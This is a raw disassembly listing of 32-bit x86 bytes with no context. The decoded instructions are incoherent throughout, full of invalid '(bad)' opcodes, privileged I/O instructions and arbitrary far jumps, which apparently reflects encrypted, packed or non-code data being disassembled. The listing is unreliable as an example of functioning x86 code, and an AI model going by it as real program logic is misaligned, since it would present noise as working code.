  402f48:	inc    esp
  402f49:	shl    BYTE PTR [ebx+0x1e],1
  402f4c:	shl    ebx,0xcf
  402f4f:	add    edi,edi
  402f51:	stos   DWORD PTR es:[edi],eax
  402f52:	scas   al,BYTE PTR es:[edi]
  402f53:	sahf   
  402f54:	ss jno 0x402ef7
  402f57:	sub    al,0x40
  402f59:	leave  
  402f5a:	sub    eax,0xc9d20297
  402f5f:	cs mov ebx,0xfe94cd2
  402f65:	(bad)  
  402f66:	jne    0x402f54
  402f68:	push   ds
  402f69:	mov    ebx,0xaa7d7117
  402f6e:	(bad)  
  402f6f:	nop
  402f70:	inc    ebx
  402f71:	fnstenv [eax+0x48a15fe1]
  402f77:	xchg   ecx,eax
  402f78:	jp     0x402fe7
  402f7a:	call   0x75daf727
  402f7f:	jb     0x402f28
  402f81:	dec    ecx
  402f82:	jp     0x402f09
  402f84:	sbb    ecx,0x9357e273
  402f8a:	xrelease mov DWORD PTR [ebp+0x1ae54dc9],esp
  402f91:	or     al,0x5
  402f93:	cmp    al,0x82
  402f95:	cwde   
  402f96:	popa   
  402f97:	stos   BYTE PTR es:[edi],al
  402f98:	fs cli 
  402f9a:	sub    al,0x17
  402f9c:	arpl   WORD PTR [ebp-0x2c],bx
  402f9f:	add    BYTE PTR [ebx-0x786bd4d6],dl
  402fa5:	mov    ?,WORD PTR [ecx+0x22]
  402fa8:	fs cwde 
  402faa:	std    
  402fab:	mov    BYTE PTR [esi+0x40],0x7c
  402faf:	mov    ah,0x57
  402fb1:	mov    esi,0x2cdee719
  402fb6:	cmp    DWORD PTR [eax-0x38],eax
  402fb9:	xor    cl,BYTE PTR [esp+ecx*1]
  402fbc:	loopne 0x402f77
  402fbe:	jb     0x402fef
  402fc0:	or     eax,0x9f224c7a
  402fc5:	repnz inc ecx
  402fc7:	ds xchg ebp,eax
  402fc9:	das    
  402fca:	dec    ebx
  402fcb:	and    al,0x60
  402fcd:	jecxz  0x402fae
  402fcf:	jge    0x403022
  402fd1:	hlt    
  402fd2:	push   ss
  402fd3:	aam    0x1
  402fd5:	test   al,0x6c
  402fd7:	cmp    BYTE PTR [ebx-0x4535cb8b],al
  402fdd:	mov    dh,0xa
  402fdf:	jle    0x402fed
  402fe1:	xchg   ecx,eax
  402fe2:	jmp    0x828d:0xbbdcdcc8
  402fe9:	xchg   edx,eax
  402fea:	(bad)  
  402feb:	out    0x90,eax
  402fed:	fwait
  402fee:	mov    edi,0x5cb869ba
  402ff3:	or     al,0xef
  402ff5:	scas   eax,DWORD PTR es:[edi]
  402ff6:	push   ebp
  402ff7:	fsubp  st(2),st
  402ff9:	xchg   ecx,eax
  402ffa:	pusha  
  402ffb:	mov    bh,0xc8
  402ffd:	adc    ecx,edx
  402fff:	test   al,0xb3
  403001:	adc    al,0x2b
  403003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403004:	imul   cl
  403006:	mov    dh,0x75
  403008:	mov    cl,0xe5
  40300a:	ror    esi,1
  40300c:	jmp    0xf54e:0x95691bf5
  403013:	pop    ds
  403014:	jmp    0x402fca
  403016:	or     al,0xf0
  403018:	add    ebp,eax
  40301a:	retf   
  40301b:	or     DWORD PTR [eiz*2-0x4f580c11],edx
  403022:	inc    ebp
  403023:	popa   
  403024:	jmp    0xa6f5:0x3c6e8ee
  40302b:	push   0x7f
  40302d:	dec    ebx
  40302e:	out    0x2a,al
  403030:	sub    DWORD PTR [esi+ebx*4+0xe],ebp
  403034:	mov    WORD PTR [eax+0x70],es
  403037:	aas    
  403038:	fcom   st(1)
  40303a:	push   ebp
  40303b:	lock call 0x2d41:0xd072bd20
  403043:	hlt    
  403044:	rcr    cl,1
  403046:	leave  
  403047:	stos   DWORD PTR es:[edi],eax
  403048:	cmc    
  403049:	sub    eax,0xdf48629
  40304e:	pop    edi
  40304f:	push   es
  403050:	mov    ebp,0x62454bbe
  403055:	cmp    DWORD PTR ds:0x38f58755,eax
  40305b:	sbb    DWORD PTR [edi+0x5d116638],eax
  403061:	in     eax,0xc3
  403063:	xor    BYTE PTR [ebx],ah
  403065:	fldcw  WORD PTR [edi-0x9]
  403068:	pop    ss
  403069:	jae    0x4030bb
  40306b:	lock in eax,dx
  40306d:	inc    esp
  40306e:	push   cs
  40306f:	out    0xf6,al
  403071:	mov    ss,WORD PTR [ebx-0x184dda0e]
  403077:	leave  
  403078:	jbe    0x402ffc
  40307a:	add    eax,DWORD PTR [edi]
  40307c:	inc    edx
  40307d:	not    cl
  40307f:	jl     0x403014
  403081:	(bad)  
  403082:	inc    ebx
  403083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403084:	std    
  403085:	mov    ds,WORD PTR [eax]
  403087:	mov    eax,0x4e64913b
  40308c:	das    
  40308d:	pusha  
  40308e:	jge    0x403020
  403090:	cdq    
  403091:	add    eax,0xe44a8cd9
  403096:	enter  0xb75f,0xd4
  40309a:	sahf   
  40309b:	mov    edx,0x405cbefb
  4030a0:	sbb    ebp,DWORD PTR [edi]
  4030a2:	scas   eax,DWORD PTR es:[edi]
  4030a3:	cs cmp eax,0x53e6d338
  4030a9:	ror    esp,0x86
  4030ac:	icebp  
  4030ad:	imul   esi,DWORD PTR [esi],0x305a05d2
  4030b3:	sub    DWORD PTR [ecx+ebp*2-0x7b],edx
  4030b7:	sahf   
  4030b8:	aas    
  4030b9:	(bad)  
  4030ba:	fadd   st(3),st
  4030bc:	jne    0x40311e
  4030be:	push   edi
  4030bf:	xchg   edx,eax
  4030c0:	std    
  4030c1:	add    BYTE PTR [ecx+0x7d],dh
  4030c4:	stos   BYTE PTR es:[edi],al
  4030c5:	test   DWORD PTR [edx],ecx
  4030c7:	push   ecx
  4030c8:	aad    0x45
  4030ca:	dec    ecx
  4030cb:	loopne 0x403124
  4030cd:	test   eax,0xa57e7d3
  4030d2:	jae    0x4030ab
  4030d4:	(bad)  
  4030d5:	icebp  
  4030d6:	mov    ?,WORD PTR [edx+0x694ec2e5]
  4030dc:	rol    DWORD PTR [edi+esi*8+0x4d],cl
  4030e0:	bound  ebx,QWORD PTR [eax-0x5b]
  4030e3:	cmp    BYTE PTR [edi-0x3e677640],ch
  4030e9:	mov    bh,0x5e
  4030eb:	loop   0x4030a9
  4030ed:	leave  
  4030ee:	fsubr  DWORD PTR [edx-0x1]
  4030f1:	pusha  
  4030f2:	adc    eax,0xfa3a038c
  4030f7:	cmp    ebp,DWORD PTR [edi]
  4030f9:	out    dx,eax
  4030fa:	popf   
  4030fb:	add    dl,BYTE PTR [ebx+0x18b2b397]
  403101:	jge    0x403162
  403103:	fidivr DWORD PTR [edx+0x21]
  403106:	adc    al,0x62
  403108:	mov    ds,WORD PTR [edi-0xb]
  40310b:	ins    BYTE PTR es:[edi],dx
  40310c:	call   0xd6d69c9d
  403111:	rol    DWORD PTR [ecx],0xdf
  403114:	add    BYTE PTR [edi],dl
  403116:	jae    0x4030ea
  403118:	icebp  
  403119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40311a:	aas    
  40311b:	xchg   ebx,eax
  40311c:	xchg   ebx,eax
  40311d:	pop    edi
  40311e:	cmp    bl,BYTE PTR [ecx]
  403120:	mov    ebx,0xe186eae5
  403125:	inc    eax
  403126:	xchg   esp,eax
  403127:	push   ss
  403128:	lods   al,BYTE PTR ds:[esi]
  403129:	mov    cl,0x9d
  40312b:	imul   esi,ebx,0xffffff8c
  40312e:	rcl    DWORD PTR [eax+0x42],1
  403131:	daa    
  403132:	jne    0x4030d4
  403134:	leave  
  403135:	mov    al,0xcc
  403137:	(bad)  
  403138:	test   DWORD PTR [ebx+0x4],esi
  40313b:	jge    0x403170
  40313d:	mov    edi,0x5c31c581
  403142:	(bad)  
  403143:	sti    
  403144:	out    0xba,eax
  403146:	cmc    
  403147:	xor    eax,0x77e3236c
  40314c:	inc    ebp
  40314d:	inc    esi
  40314e:	mov    ebp,esp
  403150:	cli    
  403151:	bound  edx,QWORD PTR [edi]
  403153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403154:	cs adc ch,al
  403157:	inc    esi
  403158:	pop    ecx
  403159:	or     eax,esp
  40315b:	shl    BYTE PTR [eax],1
  40315d:	mov    edx,ss
  40315f:	bound  eax,QWORD PTR [edi-0x51]
  403162:	stos   DWORD PTR es:[edi],eax
  403163:	or     BYTE PTR [esi+edi*8+0x7c],cl
  403167:	push   es
  403168:	repnz inc eax
  40316a:	adc    ebx,DWORD PTR [ebp+0x535b38b6]
  403170:	xor    BYTE PTR [edi-0x14ca8071],bl
  403176:	and    al,BYTE PTR ds:0xe1bbef98
  40317c:	inc    eax
  40317d:	popf   
  40317e:	inc    edi
  40317f:	dec    esi
  403180:	fld    st(2)
  403182:	sub    ch,cl
  403184:	in     eax,0xd0
  403186:	inc    esp
  403187:	jns    0x4031a6
  403189:	add    edx,DWORD PTR [edx]
  40318b:	cmp    ah,BYTE PTR [edx+0x4a]
  40318e:	adc    eax,0xd5221077
  403193:	pop    ebp
  403194:	loope  0x40314d
  403196:	aad    0x62
  403198:	rcl    DWORD PTR [ecx],0x53
  40319b:	outs   dx,DWORD PTR ds:[esi]
  40319c:	inc    ebx
  40319d:	fldenv [eax-0x33c540db]
  4031a3:	repnz xor DWORD PTR ds:0x6ef1133c,0xfffffff8
  4031ab:	dec    ecx
  4031ac:	and    al,bl
  4031ae:	pop    ebx
  4031af:	jno    0x40317b
  4031b1:	pop    esp
  4031b2:	std    
  4031b3:	leave  
  4031b4:	fmul   QWORD PTR [esi]
  4031b6:	adc    ebp,DWORD PTR [eax-0x2e]
  4031b9:	and    DWORD PTR [ecx],edi
  4031bb:	sub    eax,0xf8ee7a52
  4031c0:	cdq    
  4031c1:	fs in  al,0x44
  4031c4:	xchg   esi,eax
  4031c5:	xchg   ecx,eax
  4031c6:	repz retf 
  4031c8:	add    edi,DWORD PTR [edx]
  4031ca:	dec    ebp
  4031cb:	test   al,0xc9
  4031cd:	mov    bh,0x7d
  4031cf:	dec    ecx
  4031d0:	jns    0x403233
  4031d2:	inc    ebp
  4031d3:	add    al,0x1e
  4031d5:	mov    ah,0x5e
  4031d7:	enter  0xfdac,0x57
  4031db:	sbb    BYTE PTR [esi-0x2b0d020c],cl
  4031e1:	mov    edi,0xd879d702
  4031e6:	nop
  4031e7:	add    DWORD PTR [esi+ecx*8+0x2d],ebp
  4031eb:	xchg   ebp,eax
  4031ec:	mov    ch,0x5a
  4031ee:	jg     0x40320a
  4031f0:	adc    al,0x94
  4031f2:	popf   
  4031f3:	push   ebp
  4031f4:	adc    bl,BYTE PTR [ebx-0x70]
  4031f7:	jb     0x4031da
  4031f9:	retf   0xb2a2
  4031fc:	rcr    eax,0x40
  4031ff:	mov    ecx,0x163457c9
  403204:	pop    ss
  403205:	jmp    0x4d2b1266
  40320a:	push   ecx
  40320b:	repnz pop ds
  40320d:	pop    edx
  40320e:	(bad)  
  403210:	mov    ecx,edx
  403212:	femms  
  403214:	push   edx
  403215:	arpl   WORD PTR [eax+ecx*8+0x7fb3b999],cx
  40321c:	std    
  40321d:	xchg   ecx,eax
  40321e:	dec    eax
  40321f:	into   
  403220:	add    ecx,eax
  403222:	in     eax,dx
  403223:	aaa    
  403224:	es xchg edx,eax
  403226:	mov    dl,0x2a
  403228:	pop    esp
  403229:	nop
  40322a:	mov    BYTE PTR [esi],dh
  40322c:	(bad)  
  40322d:	or     ecx,DWORD PTR [ebx-0x5e]
  403230:	fisttp WORD PTR [ebx+0x50]
  403233:	sub    DWORD PTR [ecx-0x5cc090a0],edi
  403239:	xor    BYTE PTR [eax+edi*2+0x41],0x93
  40323e:	sbb    eax,DWORD PTR [edx-0x2da73a26]
  403244:	adc    DWORD PTR [esi+0x33],esi
  403247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403248:	dec    edx
  403249:	(bad)  
  40324a:	mov    edx,0xbe9dd234
  40324f:	adc    al,0xa9
  403251:	out    dx,al
  403252:	inc    esi
  403253:	(bad)  
  403254:	retf   
  403255:	pop    esi
  403256:	dec    ecx
  403257:	xor    bl,BYTE PTR [esi-0x5673b57]
  40325d:	push   cs
  40325e:	xchg   esp,eax
  40325f:	or     ah,dh
  403261:	fnstcw WORD PTR [eax+ebp*2]
  403264:	or     eax,0xed912475
  403269:	es (bad) 
  40326b:	push   esi
  40326c:	xor    eax,0xee48169c
  403271:	in     eax,0xbd
  403273:	or     DWORD PTR [esi+0x2f6592c3],ecx
  403279:	or     al,al
  40327b:	push   0x872761be
  403280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403281:	or     eax,0x52a7ee00
  403287:	pop    esi
  403288:	sub    DWORD PTR [esi+0x64],eax
  40328b:	jno    0x4032b0
  40328d:	xchg   ebp,eax
  40328e:	in     al,dx
  40328f:	sbb    al,0xbf
  403291:	jno    0x40323e
  403293:	sbb    DWORD PTR [edi+0x1c],esp
  403296:	or     eax,0x4f25b2b8
  40329b:	mov    bl,0x84
  40329d:	pop    ds
  40329e:	jmp    0x403284
  4032a0:	mov    al,0xeb
  4032a2:	jno    0x40327e
  4032a4:	mov    ecx,0x27cd735a
  4032a9:	ja     0x40323e
  4032ab:	mov    BYTE PTR [ecx],dl
  4032ad:	push   0xcb46ed84
  4032b2:	or     eax,0xdf8f02d9
  4032b7:	ja     0x403261
  4032b9:	test   BYTE PTR [ecx-0x1],dl
  4032bc:	dec    esi
  4032bd:	outs   dx,BYTE PTR ds:[esi]
  4032be:	call   0x25ea:0x5675236
  4032c5:	and    BYTE PTR [edi-0x2c],0xb6
  4032c9:	pop    edx
  4032ca:	sar    BYTE PTR [edx+0x6b978a48],1
  4032d0:	sub    eax,0xb2ff85c7
  4032d5:	mov    bl,0x39
  4032d7:	hlt    
  4032d8:	dec    edx
  4032d9:	jno    0x4032a9
  4032db:	(bad)  [ebx]
  4032dd:	out    0x57,eax
  4032df:	pop    bp
  4032e1:	adc    esi,DWORD PTR [ecx]
  4032e3:	adc    bl,dh
  4032e5:	rcl    BYTE PTR [edi],cl
  4032e7:	je     0x40334b
  4032e9:	pop    es
  4032ea:	inc    edx
  4032eb:	pop    ecx
  4032ec:	jo     0x4032d8
  4032ee:	loopne 0x4032b8
  4032f0:	dec    edi
  4032f1:	fadd   QWORD PTR [ecx+0x6d]
  4032f4:	push   ebx
  4032f5:	popa   
  4032f6:	das    
  4032f7:	or     DWORD PTR [edi+0x4b5b59b4],eax
  4032fd:	adc    al,0x4f
  4032ff:	pop    ecx
  403300:	sub    cl,bh
  403302:	lahf   
  403303:	imul   esi,DWORD PTR [ebp+eiz*8+0x52],0xdc3fdf99
  40330b:	imul   edx,eax,0x29
  40330e:	mov    BYTE PTR [eax+0x8],ch
  403311:	sahf   
  403312:	bound  ebp,QWORD PTR ds:0xda7cffeb
  403318:	call   0x69528683
  40331d:	shl    DWORD PTR [ebp+0x4e6deabc],cl
  403323:	and    ebp,DWORD PTR [esi-0x21]
  403326:	sub    al,0xb7
  403328:	adc    DWORD PTR [edx],esi
  40332a:	inc    edx
  40332b:	jae    0x403348
  40332d:	outs   dx,DWORD PTR ds:[esi]
  40332e:	imul   edi,DWORD PTR [esi+edx*8+0x2e],0xceca148d
  403336:	test   eax,0x4cfa61a0
  40333b:	mov    bh,0x1e
  40333d:	dec    ecx
  40333e:	jmp    0xf0c79b3d
  403343:	mov    esp,0x30caf233
  403348:	adc    DWORD PTR [ebx+0x2ed4f699],ebp
  40334e:	jb     0x403311
  403350:	xlat   BYTE PTR es:[ebx]
  403352:	inc    ebx
  403353:	push   0x43
  403355:	(bad)  
  403356:	out    0x87,al
  403358:	(bad)  
  40335a:	or     al,0x39
  40335c:	or     ebx,eax
  40335e:	or     BYTE PTR [edi-0x53],bh
  403361:	xchg   ecx,eax
  403362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403363:	ret    
  403364:	inc    esi
  403365:	outs   dx,DWORD PTR ds:[esi]
  403366:	mov    ecx,0xd4f911bc
  40336b:	sbb    BYTE PTR [edx],0xd1
  40336e:	xchg   ebp,eax
  40336f:	jl     0x4033ad
  403371:	sbb    ebp,DWORD PTR [ebp-0xe368d84]
  403377:	add    BYTE PTR [eax+0x71a8a5b],ch
  40337d:	les    ecx,FWORD PTR [esi]
  40337f:	push   ds
  403380:	xor    al,0x3c
  403382:	add    edx,DWORD PTR [esi]
  403384:	aam    0x51
  403386:	sbb    bl,BYTE PTR [edx-0x29]
  403389:	add    bl,dh
  40338b:	cmp    al,0x2
  40338d:	mov    ecx,0xbf57c74f
  403392:	das    
  403393:	sub    al,0x61
  403395:	(bad)  
  403396:	cli    
  403397:	jb     0x403338
  403399:	call   0xc720d41a
  40339e:	sbb    DWORD PTR [edi-0x31],edx
  4033a1:	pop    edx
  4033a2:	lods   al,BYTE PTR ds:[esi]
  4033a3:	ins    BYTE PTR es:[edi],dx
  4033a4:	mov    eax,0x83912e45
  4033a9:	sti    
  4033aa:	aad    0x29
  4033ac:	adc    BYTE PTR [ebp+eiz*2-0x3161f62f],0x10
  4033b4:	inc    esi
  4033b5:	in     eax,dx
  4033b6:	fisub  DWORD PTR [edi-0x15]
  4033b9:	adc    DWORD PTR [esi-0x4400ca4c],edi
  4033bf:	sbb    bl,dl
  4033c1:	xchg   ecx,eax
  4033c2:	stc    
  4033c3:	mov    eax,ds:0x72a5a5e5
  4033c8:	sub    eax,0x76c14e5a
  4033cd:	inc    eax
  4033ce:	xor    cl,0xcf
  4033d1:	inc    edi
  4033d2:	mov    ch,0x3b
  4033d4:	sbb    esp,DWORD PTR [eax-0x74]
  4033d7:	daa    
  4033d8:	stos   DWORD PTR es:[edi],eax
  4033d9:	daa    
  4033da:	sti    
  4033db:	test   al,0x88
  4033dd:	mov    BYTE PTR [eax+eiz*4+0x70],al
  4033e1:	push   ss
  4033e2:	cmp    bh,bh
  4033e4:	xchg   edx,eax
  4033e5:	cwde   
  4033e6:	adc    eax,0x5a1018a9
  4033eb:	mov    DWORD PTR [ebp-0x3b985624],esp
  4033f1:	pop    eax
  4033f2:	jns    0x4033c0
  4033f4:	cmp    DWORD PTR [ebx-0x107b6f65],eax
  4033fa:	aad    0xcf
  4033fc:	cmp    DWORD PTR [ebx],ebp
  4033fe:	xchg   ebx,eax
  4033ff:	xchg   BYTE PTR [ecx+0x3b149245],ah
  403405:	sub    cl,BYTE PTR [esi-0x551c2e89]
  40340b:	mov    ebp,0x49a7e9ac
  403410:	sub    eax,DWORD PTR [eax+ebp*1+0x3173e175]
  403417:	fstp   DWORD PTR [edi-0x2b]
  40341a:	iret   
  40341b:	and    ecx,ebx
  40341d:	add    al,0xa4
  40341f:	lock stos DWORD PTR es:[edi],eax
  403421:	inc    ecx
  403422:	mov    BYTE PTR gs:[ebp+0x35799a20],dl
  403429:	fsub   QWORD PTR [edi+0x67d3529c]
  40342f:	imul   esi,DWORD PTR [esi],0xffffffd3
  403432:	or     DWORD PTR [edi+ecx*8-0x34],ebp
  403436:	mov    al,ds:0xe86fba23
  40343b:	jbe    0x4033f8
  40343d:	repnz mov edx,0xb8f8d18
  403443:	popa   
  403444:	or     BYTE PTR [ebx+0x16],ch
  403447:	repnz xchg edi,eax
  403449:	mov    ebp,0x386b0daf
  40344e:	sbb    eax,0x193f1fc3
  403453:	cmp    ebp,DWORD PTR [ebp-0x33316f9]
  403459:	mov    ah,0xe
  40345b:	or     eax,DWORD PTR [edx]
  40345d:	ret    
  40345e:	pop    edi
  40345f:	xlat   BYTE PTR ds:[ebx]
  403460:	inc    ebx
  403461:	xlat   BYTE PTR ds:[ebx]
  403462:	int    0x98
  403464:	jmp    DWORD PTR [edx-0x1a9b48f4]
  40346a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40346b:	ins    DWORD PTR es:[edi],dx
  40346c:	imul   edi,DWORD PTR [eax+0x73dac7b5],0xffffffe6
  403473:	jp     0x403496
  403475:	lods   al,BYTE PTR ds:[esi]
  403476:	xchg   esp,eax
  403477:	pop    es
  403478:	dec    edx
  403479:	push   0x2fd3dbd5
  40347e:	and    bl,BYTE PTR [edi-0x55]
  403481:	sub    al,0xf3
  403483:	xchg   esp,eax
  403484:	mov    DWORD PTR [ecx+0x29de9702],0xb3216ddc
  40348e:	rcl    BYTE PTR [ecx],0x9
  403491:	xlat   BYTE PTR ds:[ebx]
  403492:	push   cs
  403493:	pushf  
  403494:	jp     0x4034fe
  403496:	add    BYTE PTR [eax+0x28],cl
  403499:	idiv   BYTE PTR [ebx]
  40349b:	(bad)  
  40349d:	loope  0x4034f7
  40349f:	not    ah
  4034a1:	xchg   DWORD PTR [edx+0x6c190dd1],edi
  4034a7:	adc    al,0x20
  4034a9:	pop    edx
  4034aa:	addr16 mov ah,0x8b
  4034ad:	mov    ah,0x22
  4034af:	shl    ch,0x21
  4034b2:	pop    esp
  4034b3:	jnp    0x4034c9
  4034b5:	js     0x403502
  4034b7:	inc    ebx
  4034b8:	dec    ebp
  4034b9:	mov    al,0x11
  4034bb:	xchg   BYTE PTR [edx+0x57],cl
  4034be:	dec    ebp
  4034bf:	cmp    dh,cl
  4034c1:	xor    eax,edi
  4034c3:	mov    eax,0xd580f205
  4034c8:	or     al,0xfa
  4034ca:	es mov ebx,0x3d8722b2
  4034d0:	dec    ecx
  4034d1:	jnp    0x403548
  4034d3:	lock jmp 0x32b78b2a
  4034d9:	dec    ebp
  4034da:	push   ds
  4034db:	push   esi
  4034dc:	mov    ah,0x36
  4034de:	ins    BYTE PTR es:[edi],dx
  4034df:	cmp    ch,ch
  4034e1:	lea    ebp,[eax+0x2b]
  4034e4:	cmp    al,BYTE PTR [eax]
  4034e6:	cmp    dh,0xd2
  4034e9:	mov    esp,0x3a7f21d
  4034ee:	jns    0x40352f
  4034f0:	shr    BYTE PTR [eax+0x4a],1
  4034f3:	pop    ss
  4034f4:	push   edi
  4034f5:	sahf   
  4034f6:	sub    eax,0xd610e422
  4034fb:	or     eax,0x75807d0a
  403500:	xchg   esp,eax
  403501:	sub    BYTE PTR [ebx-0x7c6bee5],ah
  403507:	jmp    0x8cfe1784
  40350c:	inc    esi
  40350d:	int    0x4e
  40350f:	ficom  WORD PTR [edx-0x7aabe990]
  403515:	cmp    eax,0xc4add05a
  40351a:	adc    eax,0x363be509
  40351f:	mov    ah,BYTE PTR [eax+0x267ec85a]
  403525:	xor    ebx,0x7a
  403528:	push   edx
  403529:	jbe    0x403531
  40352b:	xchg   eax,ebx
  40352d:	mov    WORD PTR [ebx-0x7c],?
  403530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403531:	out    dx,al
  403532:	add    esp,DWORD PTR [ebx-0x59]
  403535:	fs stos DWORD PTR es:[edi],eax
  403537:	(bad)  
  403539:	retf   0xe78
  40353c:	fst    QWORD PTR [eax-0x65]
  40353f:	push   0x9fc957d0
  403544:	into   
  403545:	aas    
  403546:	pushf  
  403547:	mov    eax,ds:0x54b0e03a
  40354c:	jne    0x4035a1
  40354e:	inc    edi
  40354f:	daa    
  403550:	cmc    
  403551:	or     eax,0x690e3baf
  403556:	(bad)  
  403557:	(bad)  
  403559:	push   ds
  40355a:	xor    esi,DWORD PTR [edi+0x38f4fe11]
  403560:	mov    esp,0x3d4c9656
  403565:	es sti 
  403567:	push   eax
  403568:	push   0xbc68d1cd
  40356d:	adc    esp,DWORD PTR [ebx+eax*2+0x36]
  403571:	pop    eax
  403572:	inc    esp
  403573:	jmp    0x97b:0xb9c1e40a
  40357a:	or     al,0x32
  40357c:	dec    ebp
  40357d:	(bad)  
  40357e:	xchg   esi,eax
  40357f:	dec    edx
  403580:	mov    ah,0x42
  403582:	(bad)  
  403584:	(bad)  
  403586:	hlt    
  403587:	das    
  403588:	clc    
  403589:	or     al,0xcb
  40358b:	and    ah,BYTE PTR [ecx-0x33f495e6]
  403591:	jmp    0x4920:0x9fc5734d
  403598:	add    al,0xdf
  40359a:	adc    eax,0x17c1abf8
  40359f:	xchg   edx,eax
  4035a0:	rol    DWORD PTR [ecx],cl
  4035a2:	inc    ebx
  4035a3:	inc    eax
  4035a4:	push   0x8618ac6d
  4035a9:	adc    ebx,ebx
  4035ab:	aam    0x36
  4035ad:	mov    ds:0xa093e405,al
  4035b2:	dec    edx
  4035b3:	mov    cl,BYTE PTR [edi-0x48]
  4035b6:	enter  0xd7a2,0x94
  4035ba:	imul   eax,DWORD PTR [edi],0x13daf438
  4035c0:	xor    BYTE PTR [ebp+edi*8-0x2c0ad02a],ah
  4035c7:	add    al,0xdd
  4035c9:	(bad)  
  4035ca:	out    dx,eax
  4035cb:	aad    0x2c
  4035cd:	bnd jg 0x403620
  4035d0:	out    dx,eax
  4035d1:	repnz retf 
  4035d3:	add    BYTE PTR [edi],ah
  4035d5:	jno    0x4035f3
  4035d7:	pop    ecx
  4035d8:	jne    0x4035b6
  4035da:	shl    dh,1
  4035dc:	(bad)
  4035df:	nop
  4035e0:	sub    BYTE PTR [edi+0x6ba6f238],bh
  4035e6:	ins    DWORD PTR es:[edi],dx
  4035e7:	and    al,0xb3
  4035e9:	push   esi
  4035ea:	push   cs
  4035eb:	sti    
  4035ec:	(bad)  
  4035ed:	adc    eax,0x542dd0b8
  4035f2:	or     al,0x8d
  4035f4:	repz xchg ecx,eax
  4035f6:	inc    esi
  4035f7:	jb     0x4035f3
  4035f9:	aam    0xe4
  4035fb:	clc    
  4035fc:	ja     0x4035d1
  4035fe:	aaa    
  4035ff:	pop    ecx
  403600:	data16 (bad) [edi+0x7a744693]
  403607:	or     eax,0x6be0f38d
  40360c:	inc    ebp
  40360d:	add    dl,bh
  40360f:	mov    ecx,DWORD PTR [ecx-0x5d1f5557]
  403615:	pop    ds
  403616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403617:	dec    esp
  403618:	shr    BYTE PTR [eax],cl
  40361a:	mov    ch,0xe1
  40361c:	jae    0x4035c1
  40361e:	jnp    0x4035be
  403620:	neg    DWORD PTR [esi+0x36c48f05]
  403626:	jnp    0x4035e5
  403628:	pop    esp
  403629:	mov    ebx,0x10da8c14
  40362e:	pop    edi
  40362f:	stos   BYTE PTR es:[edi],al
  403630:	test   al,0x40
  403632:	or     dh,BYTE PTR [esi+0x72]
  403635:	enter  0x14ac,0x3f
  403639:	int    0xc2
  40363b:	les    edi,FWORD PTR [ecx-0x7f]
  40363e:	pop    edx
  40363f:	js     0x4035ef
  403641:	jbe    0x4036ac
  403643:	in     eax,0x97
  403645:	fld    TBYTE PTR [edi+0x53]
  403648:	jp     0x403611
  40364a:	rol    BYTE PTR [edi+0x3f67ae76],1
  403650:	pop    esp
  403651:	pop    ebp
  403652:	cmc    
  403653:	cmp    edx,DWORD PTR [edi-0x34]
  403656:	jb     0x4035f2
  403658:	jae    0x403697
  40365a:	push   es
  40365b:	xchg   ecx,eax
  40365c:	pop    edi
  40365d:	fs pop ecx
  40365f:	inc    ebp
  403660:	mov    ebx,0x88a6e9a2
  403665:	shl    DWORD PTR [eax+0x34ba3fd3],cl
  40366b:	pop    ecx
  40366c:	mov    ds:0x1a8d4a8f,eax
  403671:	cmp    dl,BYTE PTR [ecx-0x50a8c4a8]
  403677:	pop    edi
  403678:	mov    ecx,0x15b44f6c
  40367d:	xchg   DWORD PTR [ecx],esi
  40367f:	xchg   edx,eax
  403680:	cld    
  403681:	cld    
  403682:	push   0x3f
  403684:	sub    bh,BYTE PTR [ecx]
  403686:	mov    dh,0xff
  403688:	cmp    edi,DWORD PTR [edi-0x16a4b00c]
  40368e:	cmp    cl,BYTE PTR [ebp+0x405c1ba7]
  403694:	mov    esp,0x69579045
  403699:	es and dl,dl
  40369c:	push   esi
  40369d:	imul   ebp,DWORD PTR [ecx],0x7b
  4036a0:	aam    0x47
  4036a2:	jecxz  0x403626
  4036a4:	mov    edi,0x81782df3
  4036a9:	add    BYTE PTR [esi-0x2f],dh
  4036ac:	inc    esi
  4036ad:	jmp    0x4036c9
  4036af:	pop    ebx
  4036b0:	mov    BYTE PTR [edx+0x4a],dl
  4036b3:	outs   dx,DWORD PTR ds:[esi]
  4036b4:	dec    ebx
  4036b5:	push   cs
  4036b6:	or     BYTE PTR [ebp+0x73],al
  4036b9:	int3   
  4036ba:	jae    0x4036a6
  4036bc:	mov    ds,esi
  4036be:	and    DWORD PTR [eax],edx
  4036c0:	ret    0x310e
  4036c3:	sysret 
  4036c5:	retf   
  4036c6:	cmp    BYTE PTR [edi],ah
  4036c8:	(bad)  
  4036c9:	fldenv [eax-0x6e]
  4036cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036cd:	mov    esp,0x8e45a855
  4036d2:	push   esi
  4036d3:	iret   
  4036d4:	or     DWORD PTR [eax+ebp*1+0x45],ebp
  4036d8:	mov    ebx,DWORD PTR [edx-0x5f]
  4036db:	arpl   WORD PTR [ebx],dx
  4036dd:	enter  0x1e2b,0x46
  4036e1:	inc    edi
  4036e2:	cli    
  4036e3:	add    BYTE PTR ds:0x3abc3b3f,dh
  4036e9:	out    0x44,eax
  4036eb:	and    eax,0x1c4488c1
  4036f0:	jg     0x40371e
  4036f2:	mov    bh,ch
  4036f4:	lods   al,BYTE PTR ds:[esi]
  4036f5:	xor    al,0xc9
  4036f7:	mov    ah,0x6c
  4036f9:	ror    DWORD PTR [ebx-0x56],0xa9
  4036fd:	js     0x4036a2
  4036ff:	cmp    edx,eax
  403701:	and    BYTE PTR [esi],al
  403703:	ss xchg ebx,esi
  403706:	or     ch,BYTE PTR [ebx+0x48]
  403709:	js     0x40372e
  40370b:	and    esp,esi
  40370d:	in     eax,0xf5
  40370f:	mov    bl,0x23
  403711:	jmp    0xe813:0x8603e4b7
  403718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403719:	lods   al,BYTE PTR ds:[esi]
